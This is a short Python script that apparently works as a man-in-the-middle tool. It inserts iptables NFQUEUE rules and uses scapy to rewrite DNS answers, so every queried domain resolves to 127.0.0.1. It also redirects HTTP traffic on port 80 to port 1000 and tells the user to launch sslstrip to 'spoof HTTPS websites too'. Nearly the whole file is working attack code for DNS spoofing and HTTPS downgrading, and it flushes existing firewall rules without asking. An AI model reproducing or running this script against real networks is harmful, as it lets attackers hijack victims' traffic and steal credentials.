import netfilterqueue
import subprocess,time
import scapy.all as scapy

queue_num = 0
subprocess.call(["iptables","--flush"])
subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num"," 0"])
subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num"," 0"])
print("type sslstrip in new terminal to spoof HTTPS websites too.")
subprocess.call("gnome-terminal",shell=True)
print("Compiling the script.....")
time.sleep(10)
subprocess.call("clear",shell=True)
print("Script is running now.....")
subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000",shell=True)
try:
	def process_packet(packet):
		scapy_packet=scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):
			qname=scapy_packet[scapy.DNSQR].qname
			if qname in qname:
				print("[+]Spoofing : " +qname)
				ans=scapy.DNSRR(rrname=qname,rdata='127.0.0.1')
				scapy_packet[scapy.DNS].an=ans
				scapy_packet[scapy.DNS].ancount=1
				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].chksum
				del scapy_packet[scapy.UDP].len
				del scapy_packet[scapy.UDP].chksum
				packet.set_payload(str(scapy_packet))
		packet.accept()


	queue = netfilterqueue.NetfilterQueue()
	queue.bind(queue_num, process_packet)
	queue.run()

except KeyboardInterrupt:
	try:
		subprocess.call("iptables --flush",shell=True)
	except Exception,e:
		print(e)
	print("Process End by the user!")
